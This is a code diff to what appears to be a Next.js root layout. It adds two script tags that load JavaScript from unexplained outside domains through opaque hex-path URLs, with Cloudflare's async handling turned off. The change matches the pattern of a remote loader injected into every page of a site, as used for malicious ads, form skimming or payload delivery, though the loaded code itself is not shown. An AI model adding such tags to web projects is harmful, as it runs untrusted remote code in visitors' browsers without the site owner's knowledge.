@@ -69,6 +69,14 @@ export default function RootLayout({ children }: { children: React.ReactNode }) 
           }}
         />
         <SiteShell>{children}</SiteShell>
+        <script
+          data-cfasync="false"
+          src="https://abscloud.org/1/70da7873803cb897757d9b2a4c75998d"
+        />
+        <script
+          data-cfasync="false"
+          src="https://bauval.org/14/9b30e5cfcff1ffff1fafcb97be3fdb9b"
+        />
       </body>
     </html>
   );
